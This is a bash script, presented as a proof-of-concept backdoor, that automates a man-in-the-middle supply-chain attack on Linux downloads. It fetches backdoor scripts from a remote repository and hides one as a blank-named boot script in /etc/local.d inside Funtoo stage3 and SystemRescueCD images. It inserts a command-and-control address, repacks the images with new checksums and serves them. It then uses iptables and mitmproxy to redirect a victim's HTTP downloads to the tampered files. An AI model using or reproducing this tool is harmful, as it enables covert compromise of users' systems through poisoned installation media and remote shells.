#!/bin/bash
#
# Copyright terabit 2016
# Copyright kaneda  2016
#
# Last updated: 2016-03-31
# Description: Proof of concept backdoor, currently only
#              tested on Funtoo

# Dependencies
EXEC_PORTAGE="emerge pip cdrtools squashfs-tools"
EXEC_APT="apt-get install python-pip squashfs-tools genisoimage"
EXEC_YUM="yum install python-pip squashfs-tools mkisofs cdrtools"

function usage {
    echo "Please specify the client IP and the command and control server"
    echo "Usage: $0 <victim_ip> <cnc>"
    exit 1
}

#include openssl,netcat,wget here if they aren't installed
function install_packages {
    if [ $(which emerge) ]; then
        $EXEC_PORTAGE
    elif [ $(which apt-get) ]; then
        $EXEC_APT
    elif [ $(which yum) ]; then
        $EXEC_YUM
    else
        echo "You must have one of emerge, apt-get, or yum to install dependencies"
        echo "We're continuing anyways, good luck!"
    fi
}

function install_pypi {
    if [ $(which pip) ]; then
        pip install mitmproxy twisted
    else
        echo "Couldn't find pip, needed to install mitmproxy and twisted."
        exit 1
    fi
}

if [ $# -lt 2 ]; then
    usage
fi

VICTIM_IP="$1"
CNC="$2"

install_packages

install_pypi

# Ideally you will set this up on your own system and just wget
# the backdoored stage3 and iso.
#
# However in this case I will use the compromised network
# device to setup the backdoored files.

mkdir work && cd work

## good spot to insert per-distro conditionals in the future.
mkdir backdoor-stage3 backdoor-iso-ro backdoor-iso-rw out

# Get all the packages
wget http://build.funtoo.org/funtoo-current/x86-64bit/generic_64/stage3-latest.tar.xz #replace with current stage3 url
wget http://build.funtoo.org/distfiles/sysresccd/systemrescuecd-x86-4.7.1.iso

RESCUE_BASE="systemrescuecd-x86-4.7.1"

# Mount the ISO
mount -oloop ./${RESCUE_BASE}.iso ./backdoor-iso-ro
cp -a ./backdoor-iso-ro/* ./backdoor-iso-rw/
tar -C backdoor-stage3 -xvf ./stage3-latest.tar.xz
unsquashfs -d ./backdoor-squash/ ./backdoor-iso-ro/sysrcd.dat

# Get the backdoor scripts
curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/redirect.py > redirect.py
curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/backdoor.sh > backdoor-stage3/etc/local.d/' '

# Update the scripts with the command and control
sed -i "s/REPLACEME/$CNC/" backdoor-stage3/etc/local.d/' '
sed -i "s/REPLACEME/$CNC/" redirect.py

# Make sure the IP contained is the IP your reverse shell handler is listening on
cp backdoor-stage3/etc/local.d/' ' ./backdoor-squash/etc/local.d/' '

chmod a+x ./backdoor-stage3/etc/local.d/' '
chmod a+x ./backdoor-squash/etc/local.d/' '

# Pack backdoored files
cd backdoor-stage3
tar -cJf ../out/stage3-latest.tar.xz *
cd ../backdoor-squash
mksquashfs * ../sysrcd-backdoored.dat
cd ../backdoor-iso-rw

rm sysrcd*
mv ../sysrcd-backdoored.dat ./sysrcd.dat
md5sum sysrcd.dat > sysrcd.md5

ISO_ARGS="-o ../out/${RESCUE_BASE}.iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -J -R -V ${RESCUE_BASE} ."
if [ $(which mkisofs) ]; then
    ISO_EXEC="mkisofs"
else
    ISO_EXEC="genisoimage"
fi

$ISO_EXEC $ISO_ARGS

cd ..

ls -l out

# Start and fork twisted web server to host the backdoored files
#
# You would normally run this somewhere on the internet with a
# similar domain as the file server, either that or you can modify
# dns response to point to this target machine to fool users
# if you specify a CNC outside of the compromised box it will work fine.

echo "Starting twistd web server started on port 81"

twistd -n web -p 81 --path out&

if [ $? -ne 0 ]; then
    echo "Failed to bind 81, check that port isn't in use and try again"
    exit 1
fi

# Setup mitmproxy/mitmdump
#
# Pick victim IP, find what interface it is on, setup
# iptables rules accordingly for the interface
#
# Example:
# victim: 172.16.10.81
# ip neigh show to 172.16.10.81
# 172.16.10.81 dev eth1 lladdr ac:ef:ac:e0:c3:01 REACHABLE

if [[ "$(ip neigh show to $VICTIM_IP)" == "" ]]; then
    INTERFACE="eth0"
else
    INTERFACE="$(ip neigh show to $VICTIM_IP | awk '{print $3}')"
fi

# Set it up
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080
mitmproxy --anticache -T -s ./redirect.py

echo "Ready as can be, try downloading a target file and see if it works :)"

# Profit
